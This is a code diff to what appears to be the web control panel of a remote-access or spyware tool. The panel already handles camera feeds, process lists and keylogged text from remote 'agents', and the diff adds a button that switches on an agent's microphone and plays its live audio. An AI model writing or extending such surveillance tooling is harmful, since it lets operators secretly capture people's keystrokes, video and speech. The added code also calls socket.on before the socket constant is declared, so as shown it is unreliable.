@@ -24,6 +24,10 @@
   #cam-btn.active { background:#1a6640; color:#4ade80; }
   #cam-btn:hover:not(.active) { background:#1a6640; color:#4ade80; }
   #cam-btn.active:hover { background:#c0392b; color:#fff; }
+  #mic-btn { background:#2a2a2a; color:#aaa; }
+  #mic-btn.active { background:#1a3366; color:#60a5fa; animation:pulse 1.2s infinite; }
+  #mic-btn:hover:not(.active) { background:#1a3366; color:#60a5fa; }
+  #mic-btn.active:hover { background:#c0392b; color:#fff; }
   #rec-btn { margin-left:auto; background:#2a2a2a; color:#aaa; }
   #rec-btn:hover:not(.recording) { background:#c0392b; color:#fff; }
   #rec-btn.recording { background:#c0392b; color:#fff; animation:pulse 1.2s infinite; }
@@ -114,6 +118,7 @@
   <span id="fps-info">-- fps</span>
   <span id="rec-timer"></span>
   <button id="cam-btn" class="topbar-btn" onclick="toggleCamera()">📷 Camera</button>
+  <button id="mic-btn" class="topbar-btn" onclick="toggleMic()">🎙 Mic</button>
   <button id="rec-btn" class="topbar-btn" onclick="toggleRecord()">⏺ REC</button>
 </div>
 
@@ -202,9 +207,60 @@ const agentSelect = document.getElementById("agent-select");
 let selectedAgent = "";
 let frameCount = 0, lastFpsTime = Date.now();
 let cameraActive = false;
+let micActive = false;
 let allProcs = [];
 let alertKeywords = [];
 let keylogText = "";
+
+// ── Audio ─────────────────────────────────────────────────────────────────────
+let audioCtx = null, audioNextTime = 0;
+const SAMPLE_RATE = 16000;
+const micBtn = document.getElementById("mic-btn");
+
+function getAudioCtx() {
+  if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: SAMPLE_RATE });
+  if (audioCtx.state === "suspended") audioCtx.resume();
+  return audioCtx;
+}
+
+socket.on("audio", d => {
+  if (d._agent !== selectedAgent || !micActive) return;
+  try {
+    const ctx = getAudioCtx();
+    const binary = atob(d.data);
+    const bytes = new Uint8Array(binary.length);
+    for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
+    const samples = new Int16Array(bytes.buffer);
+    const f32 = new Float32Array(samples.length);
+    for (let i = 0; i < samples.length; i++) f32[i] = samples[i] / 32768;
+    const buf = ctx.createBuffer(1, f32.length, SAMPLE_RATE);
+    buf.copyToChannel(f32, 0);
+    const src = ctx.createBufferSource();
+    src.buffer = buf;
+    src.connect(ctx.destination);
+    const now = ctx.currentTime;
+    if (audioNextTime < now + 0.05) audioNextTime = now + 0.05;
+    src.start(audioNextTime);
+    audioNextTime += buf.duration;
+  } catch(e) {}
+});
+
+function toggleMic() {
+  if (!selectedAgent) return;
+  if (micActive) {
+    socket.emit("mic_off", { _target: selectedAgent });
+    micActive = false;
+    micBtn.textContent = "🎙 Mic";
+    micBtn.className = "topbar-btn";
+    audioNextTime = 0;
+  } else {
+    socket.emit("mic_on", { _target: selectedAgent });
+    micActive = true;
+    micBtn.textContent = "🎙 Mic ON";
+    micBtn.className = "topbar-btn active";
+    getAudioCtx();
+  }
+}
 
 const socket = io(RELAY, { transports: ["polling", "websocket"] });
 
